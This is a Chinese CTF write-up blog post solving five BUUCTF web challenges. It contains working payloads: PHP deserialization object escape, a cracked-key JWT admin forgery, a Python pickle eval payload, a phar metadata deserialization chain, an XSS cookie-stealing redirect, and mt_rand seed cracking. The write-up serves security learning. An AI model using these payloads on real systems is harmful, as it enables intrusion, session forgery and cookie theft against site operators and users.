<!--yml
category: 未分类
date: 2022-04-26 14:40:12
-->

# BUUCTF__web题解合集（八）_风过江南乱的博客-CSDN博客

> 来源：[https://blog.csdn.net/tm_1024/article/details/108554828](https://blog.csdn.net/tm_1024/article/details/108554828)

## 前言

*   距离开学还有一个星期左右，yes。虽然回去也是封闭，痛并快乐着。
*   今天看到同学假期的学习角度，感觉自己菜的不能再菜了。。。

## 题目

### 1、[安洵杯 2019]easy_serialize_php

*   打开给了源码，简单就能看到最后几行的文件读取，但分析过程我觉得比较难理解。

```
$function = @$_GET['f'];

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}

if($_SESSION){
    unset($_SESSION);
}

$_SESSION["user"] = 'guest';
$_SESSION['function'] = $function;

extract($_POST);

if(!$function){
    echo '<a href="index.php?f=highlight_file">source_code</a>';
}

if(!$_GET['img_path']){
    $_SESSION['img'] = base64_encode('guest_img.png');
}else{
    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
}

$serialize_info = filter(serialize($_SESSION));

if($function == 'highlight_file'){
    highlight_file('index.php');
}else if($function == 'phpinfo'){
    eval('phpinfo();'); 
}else if($function == 'show_image'){
    $userinfo = unserialize($serialize_info);
    echo file_get_contents(base64_decode($userinfo['img']));
} 
```

*   先是get传入的`f`变量，默认就展示了index.phpd的源代码，可以通过传入`f=phpinfo`来查看phpinfo配置信息。
*   phpinfo配置信息能泄露很多的敏感信息，其中我们就注意到 有一个`d0g3_f1ag.php`，可疑文件，很可能就是 flag 文件。同时也提示你这里面有重要信息。
    ![在这里插入图片描述](img/3df47a2857e0a885ec94982471a631c3.png)
*   但接下来利用分析就很复杂。先看最后利用的一段

```
else if($function == 'show_image'){
    $userinfo = unserialize($serialize_info);
    echo file_get_contents(base64_decode($userinfo['img']));
} 
```

*   结合前面的就相当于

    ```
    file_get_contents(base64_decode(unserialize(filter(serialize($_SESSION['img']))))) 
    ```

*   对`$_SESSION['img']` 先`serialize`函数序列化字符串，再调用`filter`函数将过滤替换为空，然后再`unserialize` 反序列化，最后再`base64_decode`函数 base 64解码。

*   一波下来最后就应该为`d0g3_f1ag.php` ，所以传入的`img`应该为它的 base64 编码 `ZDBnM19mMWFnLnBocA==` 就能读取成功。

*   接下来是

```
if(!$_GET['img_path']){
    $_SESSION['img'] = base64_encode('guest_img.png');
}else{
    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
} 
```

*   这里是对`img`变量的处理，当我们传入`$_GET['img_path']`时，它会被`sha1(）` 函数加密，后面无解密处理，这样的话我们就没办法正常指定它的值了。
*   最后看

```
if($_SESSION){
    unset($_SESSION);
}
$_SESSION["user"] = 'guest';
$_SESSION['function'] = $function;
extract($_POST); 
```

*   这里就存在变量覆盖。`unset` [函数功能](https://www.php.net/manual/zh/function.unset.php)，释放已定义的变量。`extract`[函数功能](https://www.php.net/extract)，将变量从数组中导入当前的符号表。也就是说，我们post传入一个变量`$_SESSION["user"]`=123。此时`user`就为123。

> extract函数：将变量从数组中导入当前的符号表，这里就是把post数组里的取出来变成php变量，就比如我们post传a=123,那它经过这个函数就变成了$a=123。而且它默认在变量名冲突的时候进行覆盖，这就导致了变量覆盖漏洞。

*   咋用呢，接下来就是知识点 `反序列化中的对象逃逸`
*   有一个特点是

> 因为序列化好的字符串是严格的，对应的格式不能错，比如s:4:“name”,那s:4就必须有一个字符串长度是4的否则就往后数4个。并且unserialize会把多余的字符串当垃圾处理，在花括号{}内的就是正确的，花括号后面的就都被扔掉。

```
$_SESSION['phpflag']=";s:1:\"1\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";}";

$_SESSION['img'] = base64_encode('guest_img.png');
var_dump( serialize($_SESSION) ); 
```

*   经过过滤后。`s:7:"";s:48:"` 会被当做的一部分，最后`";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}"` 被丢弃。就完成了img变量的值替换。

*   传入后`payload_1`后，可以在查看源代码中得到。刚刚传入的是`d0g3_f1ag.php`的base64值`ZDBnM19mMWFnLnBocA==` 读取它的内容如下，
    ![在这里插入图片描述](img/bbb5080cff80d0ec38203bcec1c8bef3.png)

*   同理传入`/d0g3_fllllllag`的base64值`L2QwZzNfZmxsbGxsbGFn`来读取它 。传入`payload_2` 成功解题。

    ```
    get: ?f=show_image 
    post: _SESSION[phpflag]=;s:1:"1";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";} 
    ```

*   可能这里的`反序列化中的对象逃逸`没讲的很清楚，可以[看看这个](https://blog.csdn.net/weixin_43553654/article/details/107758738?utm_medium=distribute.pc_relevant.none-task-blog-baidulandingword-2&spm=1001.2101.3001.4242)师傅的博客。

*   简单的说，就是异常闭合了原本的序列化字符串。使原本是整体的被分割。比如说被过滤替换为空的字符长度的双引号、和闭合整个字符串的花括号。我只能说这个方法挺厉害的。

### 2、[CISCN2019 华北赛区 Day1 Web2]ikun

*   这题可太麻烦了。。。
*   首先告诉你得买到`lv6` 页面最多就`lv5`，然后可以点击下一页，发现url里有一个`page` 变量，值为页数，然后一直点击下一页也没有找到。原来第一步得爆破。而判断依据就是lv标志。
    ![在这里插入图片描述](img/b35263da738f5ce622d2bdb5ce59bd6e.png)
*   所以，可以写脚本。附上自己写的垃圾脚本。

```
import requests

for i in range(0,2000):
    url = 'http://5bb9c519-40a6-43b5-8d67-2255e7337900.node3.buuoj.cn/shop?page=%d' % (
        i)
    r = requests.get(url)
    if r.status_code == 200:
        if 'lv6.png' in r.text:
            print(i)
            break
    else:
        exit(429)
    print(i) 
```

*   找到后发现我们买不起。点击价格发现有20%的优惠，抓包可以发现有价格参数和折扣参数，我们修改折扣参数到很小就能购买。
    ![在这里插入图片描述](img/08ef15bf0bee5cbb529beb2c1e2dea8f.png)

*   把`discount`的值修改为0.00000001。发包购买成功，但提示页面只允许`admin`访问。接下来就是难点了。这里使用的[JWT验证](https://www.cnblogs.com/cjsblog/p/9277677.html)
    ![在这里插入图片描述](img/e377f7f33cde94a0d7083d62e01c2efb.png)

*   里面加密的内容就是我们的用户信息。服务器通过它来确认用户。我们希望伪造它为`admin`来通过验证。

    ```
    eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEifQ.8iYM4QgkAw4NpjpP8tEn7MBbZoF-Kj8YRbosz3Qrr-Q;
    根据它的结构拆分为3部分。

    eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9     
    eyJ1c2VybmFtZSI6IjEifQ
    8iYM4QgkAw4NpjpP8tEn7MBbZoF-Kj8YRbosz3Qrr-Q; 
    ```

*   前两部分可`base64`解码，其中第二部分加上`==`可解
    ![在这里插入图片描述](img/c025f263e8fcd7350cd4d430106ddf2e.png)

*   其中，我们看到，的一部分给了加密方式。第二部分就是我们注册登录的用户名。第三部分就是签名认证。我们需要破解它来获取加密的key。用来加密我们指定的`admin`。

*   破解用到[工具脚本](https://github.com/brendan-rius/c-jwt-cracker) ，下载后，在文件目录运行终端。执行官方给的命令，成功破解出key为`1Kun`
    ![在这里插入图片描述](img/ff440b2287758237e9256f46df4b110d.png)

*   然后伪造我们指定的加密内容。[在线加密](https://jwt.io/)加载有点慢。

*   然后填上对应的内容后得到

    ```
    eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo 
    ```

![在这里插入图片描述](img/eab319392d9f250fd1d2725483d5fcd4.png)

*   然后再重新访问抓包。页面出现这个，F12查看源代码有提示，存在源码泄露。
    ![在这里插入图片描述](img/08ec5001d54b0765f62808c221aada3f.png)
    ![在这里插入图片描述](img/8ee72fdc84312f7ddb62c45d1e628431.png)
*   访问下载得到源代码。接下来就是代码审计。提示你有后门。一堆代码。。。有一说一，没开发经验，还真是不知道从何入手。
*   按wp是位于Admin.py

```
import tornado.web
from sshop.base import BaseHandler
import pickle
import urllib

class AdminHandler(BaseHandler):
    @tornado.web.authenticated
    def get(self, *args, **kwargs):
        if self.current_user == "admin":
            return self.render('form.html', res='This is Black Technology!', member=0)
        else:
            return self.render('no_ass.html')

    @tornado.web.authenticated
    def post(self, *args, **kwargs):
        try:
            become = self.get_argument('become')
            p = pickle.loads(urllib.unquote(become))
            return self.render('form.html', res=p, member=1)
        except:
            return self.render('form.html', res='This is Black Technology!', member=0) 
```

*   问题就出在反序列化`pickle.loads`。它有内置的[魔术方法](https://blog.csdn.net/bluehawksky/article/details/79027055)`__reduce__(self)`会在对象被pickle时调用
*   于是自定义序列化一个类

```
 import pickle
import urllib

class payload(object):
    def __reduce__(self):

       return (eval, ("open('/flag.txt','r').read()",)) 

a = pickle.dumps(payload())
a = urllib.quote(a)
print a 
```

![在这里插入图片描述](img/60acb77bc4181dddc0cdcf714953adfc.png)

*   这波只能说复现吧，就是看wp做。 不过了解了JWT和python的反序列化。还行。

### 3、[CISCN2019 华北赛区 Day1 Web1]Dropbox

*   打开有注册登录，但不是sql注入。随便注册登录一个之后，发现有上传。但也不是文件上传类型的题目。

*   第一个切入点就是任意文件下载，在下载的时候抓包，可以看到下载的文件名直接暴露。
    ![在这里插入图片描述](img/d48404c993c6356f1abacc099c1ae7e4.png)

*   可以通过修改文件名来实现任意文件下载。可以目录穿越来下载其它文件。为什么呢？因为上传的目录和网站根目录不是同一级。

*   所以来到第二点，下载相关文件后代码审计。已知有`index.php`、`login.php`、`register.php`，以及上传下载删除时抓包可得知`upload.php`、 `download.php`、`delete.php`，以及最后下回来审计时发现还有一个`class.php`，回去再下一次
    ![在这里插入图片描述](img/0aef8596bf075620fa1a3cfed255593d.png)

*   审计就是很麻烦的一件事，但又必须是web手必须会的技能。

*   先看注册页面，引用了`class.php`，调用了一个`add_user`函数，去`class.php` Ctrl+F 找到这个函数，同样的调用了上面的`user_exist`函数。所以先来看它，其实啥也没，就是正常的数据库交互操作。

*   然后去看`login.php`，同上面类似，也是引用了`class.php`调用了`verify_user`函数来验证用户输入，但我们注意到，它的用户名和密码是分开查询，而且它的密码注册登录都经过了一次拼接哈希，所以，这里的sql注入是不可能的

    ```
    sha1($password . "SiAchGHmFx") 
    ```

*   继续看上传的`upload.php`，文件上传的验证，分割了文件名和后缀名。限制了只能为 gif/jpg/png，并且留下了上传文件相关信息的一个`session`，在`index.php`会被读取，其它也没有什么值得注意的点。

*   而来看下载的`download.php`，引起任意文件下载的漏洞的一点就是没对下载的文件名进行过滤处理，只是检查文件名不包含`flag`关键字并且字符长度不超过40。

*   而删除页面也是很正常的，但这些文件都引用了`class.php`。接下来看它。

*   先了解几个小知识

    > 对象的所有引用都被删除或者当对象被显式销毁时执行

    > PHP5 的对象新增了一个专用方法 __call()，这个方法用来监视一个对象中的其它方法。如果你试着调用一个对象中不存在或被权限控制中的方法，__call 方法将会被自动调用。

    > phar的本质是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data

    > php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化

*   所以，最终还是一个反序列化的题目。在`class.php`最后的`file_get_contents`就能成为触发反序列化的利用点。所以我们的目标是如何来执行它。

*   `file_get_contents` 的方法`close`在类User中的 魔术方法`__destruct()`中被调用。但是并不能直接被利用，原因是无回显。

*   而有回显的地方就是在`FileList`类最后的`echo $table`，往前看它的赋值过程，在魔术方法`__call`中有一个调用参数`$func`执行并将结果给`results`数值赋值。

*   那么总的思路就是，通过上传一个`.phar`文件，然后通过文件读取来触发反序列化漏洞，来达到调用`file_get_contents`函数的目的。

*   所以最终操作

    *   先创建一个phar文件文件上传，然后通过伪协议`phar://`读取它来触发反序列化。

```
<?php

	class User
	{
		public $db;
	}
	class FileList
	{
		private $files;
		public function __construct()
		{
			$this->files=array(new File());
		}
	}
	class File
	{
		public $filename='/flag.txt';
	}

	$b=new FileList();
	$c=new User();
	$c->db=$b;

    $phar = new Phar('test.phar');
    $phar->startBuffering();
    $phar->addFromString('test.txt', 'text');
    $phar->setStub('<?php __HALT_COMPILER(); ? >');
    $phar->setMetadata($c);
    $phar->stopBuffering();
 ?> 
```

*   PHP环境运行它，在同目录下生成一个`test.phar`文件，但是有一个注意点，要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件。
*   然后再在删除它时抓包，修改`filename=phar://test.gif` 看响应报文
    ![在这里插入图片描述](img/5855bc0604d4143b19a82dd9c686f35e.png)
*   为什么是删除页面，因为里面有open文件读取函数可以来触发反序列化漏洞。
*   最后，复现是不难，但你要说每个细节那可就是直接死亡。
*   但是接触到了新的反序列化的漏洞点和一些思想方法。

### 4、[BJDCTF 2nd]xss之光

*   打开什么都没有就很可能是源码泄露。测试一下，git源码泄露，用GitHack得到源码。

```
<?php
$a = $_GET['yds_is_so_beautiful'];
echo unserialize($a); 
```

*   反序列化，没有已定义的类，[原生类反序列化](https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html)。
*   结合题目提示xss，直接传参即可。

```
<?php
$a = serialize(new Exception("<script>window.location.href='127.0.0.1'+document.cookie</script>"));
echo urlencode($a);
?> 
```

### 5、[GWCTF 2019]枯燥的抽奖

```
<?php

header("Content-Type: text/html;charset=utf-8");
session_start();
if(!isset($_SESSION['seed'])){
$_SESSION['seed']=rand(0,999999999);
}

mt_srand($_SESSION['seed']);
$str_long1 = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
$str='';
$len1=20;
for ( $i = 0; $i < $len1; $i++ ){
    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       
}
$str_show = substr($str, 0, 10);
echo "<p id='p1'>".$str_show."</p>";

if(isset($_POST['num'])){
    if($_POST['num']===$str){
        echo "<p id=flag>抽奖，就是那么枯燥且无味，给你flag{xxxxxxxxx}</p>";
    }
    else{
        echo "<p id=flag>没抽中哦，再试试吧</p>";
    }
}
show_source("check.php"); 
```

*   逻辑关系很简单，就一个相等。知识点是PHP伪随机数的破解。[相关知识](https://www.freebuf.com/vuls/192012.html)

*   其中有一个重点。

    ```
     mt_srand(),生成种子，同一个种子下随机生成的随机数值是相同的。 
    ```

*   所以，我们的目的就是通过已经给出的字符串前面部分来爆破还原随机数种子。

*   利用的[工具地址](https://www.openwall.com/php_mt_seed/)下载php_mt_seed 4.0 包到Linux下解压安装make一下。生成可执行文件。

*   但使用前还得经过一次脚本的转换。

```
str1='abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
str2='URBvNPv9GE'
str3 = str1[::-1]
length = len(str2)
res=''
for i in range(len(str2)):
    for j in range(len(str1)):
        if str2[i] == str1[j]:
            res+=str(j)+' '+str(j)+' '+'0'+' '+str(len(str1)-1)+' '
            break
print(res) 
```

*   目的是将字符串转换为符合工具`php_mt_seed`的使用的形式。为什么这样写？我就理解为像公式一样的使用。

*   然后将生成的字符串用`php_mt_seed`来破解伪随机数的`seed`

    ```
    ./php_mt_seed 生成的字符串
    ./php_mt_seed 56 56 0 61 53 53 0 61 37 37 0 61 21 21 0 61 49 49 0 61 51 51 0 61 21 21 0 61 35 35 0 61 42 42 0 61 40 40 0 61 
    ```

*   得到`seed`
    ![在这里插入图片描述](img/95465c8f37a17b53b8ae16559814d03a.png)

*   然后再放进抽奖源码中运行得到字符串。提交就得到flag。
    ![在这里插入图片描述](img/a691ffde396e678c0a31b501d7c4a710.png)

*   我感觉这就是工具的使用吧。

## 最后

*   确实没写的很清楚，跟不上了。如果有问题，可以直接留言一起探讨一下。
*   因为开学，有一段时间没好好的学习。
*   不过，国庆不能出门。。。。。。。。。。